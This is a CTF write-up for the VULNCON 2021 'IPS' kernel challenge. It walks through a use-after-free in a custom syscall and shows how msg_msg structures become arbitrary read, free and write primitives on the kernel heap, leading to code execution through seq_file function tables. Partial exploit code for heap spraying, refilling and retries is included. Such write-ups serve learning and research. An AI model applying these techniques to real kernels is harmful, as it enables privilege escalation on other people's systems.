# IPS

# 0xFF tl;dr

Introduced a method to construct arbitrary address read (Kernel Heap Area/ Object Size < 0x1000) primitive based on `msg_msg`. 

It's also a write-up for challenge IPS(VULNCON 2021).

# 0x00 Prologue

Embarking on the VULNCON 2021 challenge marked a pivotal moment in my journey into kernel exploitation. Unlike previous challenges, this was the first non-educational kernel challenge I solved, without leaning on existing write-ups for guidance. The journey to a successful exploit took **145** days—despite the actual hours invested being considerably less. This experience paralleled my initial user space challenge, ret2win, which took me over 140 hours. The initial challenge, as always, proved to be the most formidable. However, I survived! 

Immense gratitude is extended to @kylebot and @zolutal, whose invaluable support and patience were instrumental in navigating through moments of uncertainty.

A heartfelt acknowledgment goes out to the generous authors. Their willingness to share insights and knowledge on exploitation techniques immensely facilitated my learning curve.



# 0x01 Challenge

The attachment is available [here][5].

This challenge is not like other kernel challenges I solved - it implemented a syscall so our task for this challenge is exploiting the vulnerable syscall. The syscall IPS maintains an array of chunks while each chunk stores the user data. However, there are some interesting vulnerabilities in the syscall. 

## SYSCALL_DEFINE2

First, in `SYSCALL_DEFINE2`, here is a  `double_fetch`: It fetches `udata->data` twice: one for length check and another for copying. We can provide a valid length in check but provide a longer string while copying. However, Kyle told me it’s somehow hard to exploit so I just skipped this vulnerability. I’ll check why it’s hard to exploit later.

## copy_storage

Second, `copy_storage` didn’t check the return value of `target_idx` and `get_idx` may return `-1` when the array is full, which means `copy_storage` may copy the pointer to the `array[-1]`. Also, in `remove_storage`, we will not clean the pointer on `array[-1]`, which causes UAF.

## edit_storage

Luckily, for this function, it does nothing even if the `idx` is -1 so we can edit the `array[-1]`.

## Others

Other options in the challenge may pollute the kernel data, such as (`chunks[last_allocated_idx]->next = chunks[idx];` in `alloc_storage`). But it’s hard to use them to exploit so I only focused on the combination of `copy_storage` and `edit_storage` 

# 0x02 Exploitation Primitives

## I: Use After Free

After getting the vulnerabilities in the previous section, it’s easy to get the way to combine vulnerabilities in `copy_storage` and `edit_storage` :

- Allocate a chunk
- Call `copy_storage` 16 times to leave a pointer on `array[-1]`
- Free the allocated chunk
- So we get a pointer points to a `free()`ed chunk (size: 0x80)
- Refill this chunk with some kernel objects and operate the kernel objects by `edit_storage`

## II: msg_msg

`edit_storage` is quite strong and we can’t overwrite everything after 0xe bytes (no null byte included). I asked our kernel guys in the lab and they recommended me `msg_msg` which is super flexible.

```c
#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))
#define DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))

static struct msg_msg *alloc_msg(size_t len)
{
	struct msg_msg *msg;
	struct msg_msgseg **pseg;
	size_t alen;

	alen = min(len, DATALEN_MSG);
	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
	if (msg == NULL)
		return NULL;

	msg->next = NULL;
	msg->security = NULL;

	len -= alen;
	pseg = &msg->next;
	while (len > 0) {
		struct msg_msgseg *seg;

		cond_resched();

		alen = min(len, DATALEN_SEG);
		seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);
		if (seg == NULL)
			goto out_err;
		*pseg = seg;
		seg->next = NULL;
		pseg = &seg->next;
		len -= alen;
	}

	return msg;

out_err:
	free_msg(msg);
	return NULL;
}
```

`kmalloc` is invoked in function `alloc_msg`: 

- Allocate `min([0x30+size,0x1000])`
- If the `size` is larger than `0xfd0` keep allocating space until we have enough space to store the message.
- The following `msg_msgseg` will be managed as a linked list.

For people who don’t know `msg_msg`: 

- Case study zero: If we need to refill a 0x80-byte object, we can use `msg_msg` to send a `0x80-0x30` message: 0x30 is the space for `struct msg_msg`. Also, we can send a `0xfd0+0x28` -byte message.

- Case study one: if we want to allocate a 0x20-byte object, we can use `msg_msg` to send a `0xfd0+0x18` -byte message: 0x20 is less than 0x30 so we can’t allocate a 0x20-byte chunk at the first `kmalloc`. The second malloc will allocate `size-0xfd0+0x8`  bytes, where 0x8 is the size of the `next` pointer in `struct msg_msgseg` .
    
    

## III: Arbitrary Address Read

With `msg_msg`, we can refill the freed chunk. Also, because of `edit_storage`, we can edit the struct of  `msg_msg` so we can read arbitrary addresses (as long as freeing it would not lead to a crash):

- Edit the `msg_msg.m_ts` to make it larger than 0xfd0 so we can read the content in `msg_msg.next`
- Modify `msg_msg.next` and set it to the address a little lower than the area you want to read. We’d better make sure `*(size_t *)msg_msg.next==0` since `free_msg` will try to free that pointer.
- Use `SYS_msgrcv` to receive the leaked data

## IV: Arbitrary Address Free

In `SYS_msgrcv`, the corresponding `msg_msg` struct will be freed so we can modify `msg_msg.security` or `msg_msg.next` to free arbitrary object (as long as we know where it is).

## V: Arbitrary Address Write (on KHeap)

With the `Arbitrary Address Free` primitive, it’s easy to build the AAW(Arbitrary Address Write) primitive. We can first free the object on the area we want to write and then refill it to write it.

## VI: Leak KHeap-x

With the primitives above, it seems we solved this challenge but actually, you’ll find that the kernel heap is not as deterministic as the user space heap.  The offset between pages of `kmalloc-32` to `kmalloc-128` will change. So we need a way to leak the address of `Kheap-x` 

As we know, `msg_msg` is a linked list so we can chain different sizes of messages. For example, the first `msg_msg` struct is on `kmalloc-128` while the second one is on `kmalloc-196`. So we can trace the linked list to `Kheap-x` (x≤0x1000). 

For example, in this challenge, we are on `kmalloc-128` and we can read everything on that page. So we can create another `msg_msg(size=128)` struct on the same page and append a `msg_msg(size=0x196)` to it. We can leak the address of `msg_msg(size=0x196)` by reading the next pointer of `msg_msg(size=128)`. Therefore, we can combine this skill with previous skills to read and write arbitrary addresses on kernel heap(`object_size<0x1000`)!

# 0x04 Exploitation

- Use the vulnerability to edit `msg_msg.m_ts`  to leak current page address(`kmalloc-128`) and `kernel.text` address
- Combine `VI: Leak KHeap-x` and `III: Arbitrary Address Read` to leak the address of `kmalloc-32`
- Spray `kmalloc-32` with `seq_file.op`
- Use `V: Arbitrary Address Write` to modify the function tables of `seq_file` to execute  arbitrary code

# 0x09 Follow-Up

## Segment Fault after executing code
This is because I messed the kernel heap. If I still want a root shell, I can "setsuid('/bin/sh')" and gain a root shell with keeping the attacking process at background. Also, if we didn't mess the heap too much, we can hide the `system("/bin/sh")` in a segfault handler. 

## Make the Exploitation more stable

- Refill faster
```c
    ...
    msgQueueMsg * res  = msgQueueRecv(msgid1, 0xfff, 0);
    // *Avoid put other code before refilling to make it more stable
    msgQueueSend(msgid3,"Refill",0x50,ct++);
    ...
```

- Spray to improve the possibility to hit
```c
    // Spray 5 elements to improve the possibility that
    // we have at least one object after mesg1
    // The success rate ~= 5/6% 
    // We have 6 elements and we can leak as long as msgid1 is not the last one
    // We can improve it with performing it x times but too lazy to do
    int msgid2 = 0;
    for(int i =0 ; i < 0x5 ; i++){
        msgid2 = msgQueueCreate(strcat(strdup("/home/user/"),str(i+0x61)));
        msgQueueSend(msgid2,dp('\x99',8),0x50,ct++); //Mark it with '\x99'*8
        msgQueueSend(msgid2,ctx,0xfd0+0x18,ct++);
    }
    // Spray Kheap 32 with fops2:
    // Try not to use all the slot since we want to
    // 1. Arbitrary free one of fops
    // 2. Refill it
    int fds[0x40] = {0};
    for(int i = 0 ; i<0x40;i++){
        fds[i] = open("/proc/self/stat",0);
    }
```

- Retry when it's possible
```c
    msgQueueSend(msgid3,"Refill3",0x50,ct++);

    size_t * verify = &res->mtext[0xfd0];
    int ccc = 1;
    int msgid = 0;
    if( (0xfff & (size_t)(*verify)) == 0xfd0)
        puts("[+] Good Luck!");
    else{
        // Build a retry loop will try to find a fop struct.
        while(1){
            puts("[!] Retry");
            // We can quickly refill it
            ccc++;
            edit(-1,strcat(realloc(dp('\xff',2+8+8),0x80),p64(leaked_heap32+0x20*ccc-8)));
            // Prepare
            msgid = msgQueueCreate(strcat(strdup("/home/user/"),str(ccc+0x67)));
            // AAF
            res = msgQueueRecv(msgid3,0xfd0+0x8,0);
            msgQueueSend(msgid,"Refillloop",0x50,ct++);
            msgid3= msgid;
            verify = &res->mtext[0xfd0];
            if( (0xfff & (size_t)(*verify)) == 0xfd0)
                break;
        }
    }
